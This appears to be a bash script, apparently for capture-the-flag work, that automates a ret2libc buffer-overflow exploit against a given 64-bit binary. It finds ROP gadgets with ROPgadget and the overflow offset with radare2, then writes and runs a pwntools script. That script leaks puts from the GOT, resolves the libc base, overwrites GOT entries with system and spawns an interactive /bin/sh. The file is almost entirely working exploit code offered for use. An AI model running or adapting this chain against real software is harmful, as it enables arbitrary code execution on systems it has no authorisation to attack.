#!/bin/bash
line=$(ROPgadget --binary $1 | grep -x '.\{34\}' | grep -m 1 'pop rdi')
echo $line
address=${line:0:18}
echo $address

line=$(ROPgadget --binary $1 | grep -x '.\{24\}' | grep 'ret')
echo $line
address2=${line:0:18}
echo $address2

ragg2 -P 400 -r > pattern.txt
echo "!/usr/bin/rarun2" > profile.rr2
echo "stdin=./pattern.txt" >> profile.rr2
exec 3>&1 1>r2log
r2 -r profile.rr2 -d $1 << EOF
dc
wopO \`dr rbp\`
EOF

cat << EOF > sledge64.py
from pwn import *
import sys
print("STARTING PYTHON SCRIPT")
#reveng prereqs (ALSO figure out how to read the leak... e.g. putslibc = u64(leak[-7:-1]+b'\x00\x00'))
binaryname = sys.argv[1]
poprdi = sys.argv[2]
poprdi = int(poprdi, 16)
offset = int(sys.argv[3]) + 8
ret = sys.argv[4]
ret = int(ret, 16)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
putsoffset = libc.symbols['puts']
glcsysoff = libc.symbols['system']
def readleak(resp, putoff):
    findme = bytes([putoff % 256])
    addrstart = resp.find(findme)
    return u64(resp[addrstart:addrstart + 6]+b'\x00\x00')


#STUFF BENEATH HERE SHOULD RARELY CHANGE IF EVER
elf=ELF(binaryname)
#context.terminal = ['tmux', 'splitw', '-h']
p=process(binaryname)
bytediff = elf.got["gets"] - elf.got["puts"]
if (bytediff > 0):
    numgets = int(bytediff/8)
else:
    numgets = 0
print(hex(poprdi))
print("puts got {}".format(hex(elf.got['puts'])))
intro = p.recv()
print(intro)
print(offset)
print(hex(ret))
payload = b"A"*offset + p64(ret)
payload += (p64(poprdi) + p64(elf.got["puts"])) + p64(elf.plt["puts"])
payload += (p64(poprdi) + p64(elf.got["puts"])) + p64(elf.plt["gets"])
payload += (p64(poprdi) + p64(elf.got["puts"]-0x10)) + p64(elf.plt["gets"])
payload += (p64(poprdi) + p64(elf.got["puts"]-0x10)) + p64(ret) + p64(elf.plt["puts"])
print(payload)
p.sendline(payload)
leak = p.recv()
print(leak)
putslibc = readleak(leak, putsoffset)
print(hex(putslibc))

glibcbase = putslibc - putsoffset
libc.address = glibcbase
p.sendline(p64(libc.symbols["system"]) + p64(libc.symbols['gets'])*numgets)
p.sendline(b"/bin/sh\x00")
p.interactive()
EOF
chmod +x sledge64.py

exec 1>&3 3>&-
cat r2log | tail -2 > offsetfile
head -1 offsetfile > r2log
offsetminus8=$(tail -c 4 r2log)
python3 sledge64.py $1 $address $offsetminus8 $address2
